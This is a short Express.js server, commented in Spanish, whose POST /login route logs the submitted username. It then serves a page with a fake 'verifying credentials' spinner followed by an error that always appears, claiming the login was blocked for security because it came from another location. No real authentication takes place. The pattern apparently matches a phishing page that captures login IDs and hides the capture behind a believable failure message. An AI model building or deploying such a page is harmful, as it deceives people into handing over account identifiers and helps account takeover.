const express = require('express');
const app = express();
const path = require('path');

const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Ruta de Login con carga interna en la página de error
app.post('/login', (req, res) => {
    const { username } = req.body;
    console.log(`Intento de acceso - ID: ${username}`);
    
    // Enviamos una página que contiene el Spinner de Materialize y el bloque de error oculto
    res.send(`
        <!DOCTYPE html>
        <html lang="es">
        <head>
            <meta charset="UTF-8">
            <title>Validando Credenciales...</title>
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
            <style>
                body {
                    font-family: 'Segoe UI', sans-serif;
                    background-color: #f0f4f8;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .loader-container {
                    text-align: center;
                }
                .loader-container p {
                    color: #4a5568;
                    font-size: 16px;
                    margin-top: 15px;
                    font-weight: 500;
                }
                .error-box {
                    display: none; /* Oculto al principio */
                    max-width: 500px;
                    width: 90%;
                    background-color: #fff5f5;
                    border: 1px solid #fed7d7;
                    padding: 30px;
                    border-radius: 8px;
                    box-shadow: 0 4px 12px rgba(0,0,0,0.05);
                    text-align: center;
                }
                .error-icon { color: #e53e3e; font-size: 48px; margin-bottom: 15px; }
                .error-title { color: #c53030; margin-bottom: 12px; font-size: 20px; font-weight: bold; }
                .error-text { color: #4a5568; font-size: 15px; line-height: 1.6; margin-bottom: 20px; }
                .back-link { border-top: 1px solid #edf2f7; padding-top: 15px; }
                .back-link a { color: #3182ce; text-decoration: none; font-size: 14px; font-weight: bold; }
            </style>
        </head>
        <body>

            <div id="loadingView" class="loader-container">
                <div class="preloader-wrapper big active">
                    <div class="spinner-layer spinner-blue-only">
                        <div class="circle-clipper left"><div class="circle"></div></div>
                        <div class="gap-patch"><div class="circle"></div></div>
                        <div class="circle-clipper right"><div class="circle"></div></div>
                    </div>
                </div>
                <p>Cargando datos y verificando credenciales...</p>
            </div>

            <div id="errorView" class="error-box">
                <div class="error-icon">⚠️</div>
                <div class="error-title">Acceso Restringido</div>
                <p class="error-text">
                    <strong>Bloqueado por motivos de seguridad:</strong> Usted está iniciando sesión desde otra ubicación.
                </p>
                <div class="back-link">
                    <a href="/">Volver al inicio</a>
                </div>
            </div>

            <script>
                // Tras 3 segundos (3000 ms), oculta el loader y muestra el error de seguridad
                setTimeout(() => {
                    document.getElementById('loadingView').style.display = 'none';
                    document.getElementById('errorView').style.display = 'block';
                    document.title = "Error de Seguridad";
                }, 3000);
            </script>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`Servidor activo en el puerto ${PORT}`);
});
